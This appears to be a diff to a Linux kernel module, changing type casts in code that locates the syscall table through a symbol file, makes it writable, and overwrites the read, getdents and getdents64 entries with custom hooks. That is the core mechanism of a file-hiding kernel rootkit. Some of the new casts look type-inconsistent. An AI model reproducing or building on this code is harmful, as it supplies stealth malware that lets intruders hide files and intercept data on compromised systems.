@@ -115,7 +115,7 @@ typedef struct  _hook_s {
     hook_func_address address;
 }hook_s;
 
-static long unsigned int original_syscall_table[512];
+static long unsigned int* original_syscall_table[512];
 static long unsigned int* syscall_table = 0;
 
 /** __NR_read
@@ -330,7 +330,7 @@ long unsigned int* lookup_syscall_table_by_file(void) {
                      kstrtoul(table_str,16,&table_address);
                      echo("syscall_table found. address  string : %s & address number: %lu\n",table_str,table_address);
                      filp_close(fsym_file, 0);
-                     return table_address;
+                     return (long unsigned int*)table_address;
                  }
             }
 
@@ -409,15 +409,15 @@ int install_hooks(void) {
     if(make_vm_rw((long unsigned int)syscall_table)) {
         /** read
          */
-        syscall_table[__NR_read] = (long unsigned int)alpine_ksys_read;
+        syscall_table[__NR_read] = (long unsigned int*)alpine_ksys_read;
 
         /** getdents
          */
-        syscall_table[__NR_getdents] = (long unsigned int)alpine_ksys_getdents;
+        syscall_table[__NR_getdents] = (long unsigned int*)alpine_ksys_getdents;
 
         /** getdents64
          */
-        syscall_table[__NR_getdents64] = (long unsigned int)alpine_ksys_getdents64;
+        syscall_table[__NR_getdents64] = (long unsigned int*)alpine_ksys_getdents64;
         make_vm_ro((long unsigned int)syscall_table);
     }
     return 0;
